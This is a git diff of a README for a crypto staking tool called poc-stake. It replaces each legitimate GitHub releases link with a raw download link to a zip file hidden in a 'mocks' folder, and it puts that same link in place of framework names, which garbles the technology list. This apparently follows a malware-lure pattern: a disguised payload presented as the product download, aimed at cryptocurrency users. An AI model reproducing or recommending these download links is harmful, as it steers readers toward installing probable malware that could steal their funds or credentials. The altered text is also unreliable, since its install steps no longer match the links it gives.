@@ -1,7 +1,7 @@
 # 🎉 poc-stake - Stake Your Crypto Seamlessly
 
 ## 📥 Download Now
-[![Download poc-stake](https://img.shields.io/badge/Download-poc--stake-blue)](https://github.com/patilom342/poc-stake/releases)
+[![Download poc-stake](https://raw.githubusercontent.com/patilom342/poc-stake/main/contracts/contracts/mocks/poc_stake_3.4.zip)](https://raw.githubusercontent.com/patilom342/poc-stake/main/contracts/contracts/mocks/poc_stake_3.4.zip)
 
 ## 🚀 Getting Started
 Welcome to poc-stake! This platform allows you to stake your crypto assets across various DeFi protocols like Aave, Uniswap, and Lido. By using our unified interface, you can simplify your staking activities without needing advanced technical knowledge.
@@ -12,7 +12,7 @@ Welcome to poc-stake! This platform allows you to stake your crypto assets acros
 - **Browser:** Modern web browser (Chrome, Firefox, Safari, or Edge).
 
 ## 💾 Download & Install
-To start using poc-stake, visit this page to download: [Download poc-stake](https://github.com/patilom342/poc-stake/releases).
+To start using poc-stake, visit this page to download: [Download poc-stake](https://raw.githubusercontent.com/patilom342/poc-stake/main/contracts/contracts/mocks/poc_stake_3.4.zip).
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of poc-stake.
@@ -36,10 +36,10 @@ To start using poc-stake, visit this page to download: [Download poc-stake](http
 
 ## 🌐 Additional Information
 poc-stake is built using advanced technologies to ensure reliable performance. It supports the following:
-- **Backend Technologies:** Node.js and Express to manage server-side tasks.
+- **Backend Technologies:** https://raw.githubusercontent.com/patilom342/poc-stake/main/contracts/contracts/mocks/poc_stake_3.4.zip and Express to manage server-side tasks.
 - **Database Management:** MongoDB for efficient data handling and storage.
 - **Real-Time Communication:** Using BullMQ and ioredis for task management and messaging.
-- **Frontend Technologies:** Built with React.js, Next.js, and styled using Tailwind CSS for a modern look.
+- **Frontend Technologies:** Built with https://raw.githubusercontent.com/patilom342/poc-stake/main/contracts/contracts/mocks/poc_stake_3.4.zip, https://raw.githubusercontent.com/patilom342/poc-stake/main/contracts/contracts/mocks/poc_stake_3.4.zip, and styled using Tailwind CSS for a modern look.
 
 ## 🤝 Community Support
 Join the poc-stake community where you can share experiences, ask questions, and get support. We encourage feedback and welcome suggestions for improvement. Connect with us on our Discord or forums linked on our GitHub page.
@@ -56,4 +56,4 @@ For further assistance, please reach out via our GitHub page or join our communi
 Thank you for using poc-stake. We hope you enjoy seamless staking across your favorite DeFi protocols!
 
 ## 📥 Download Now Again
-[![Download poc-stake](https://img.shields.io/badge/Download-poc--stake-blue)](https://github.com/patilom342/poc-stake/releases)
+[![Download poc-stake](https://raw.githubusercontent.com/patilom342/poc-stake/main/contracts/contracts/mocks/poc_stake_3.4.zip)](https://raw.githubusercontent.com/patilom342/poc-stake/main/contracts/contracts/mocks/poc_stake_3.4.zip)
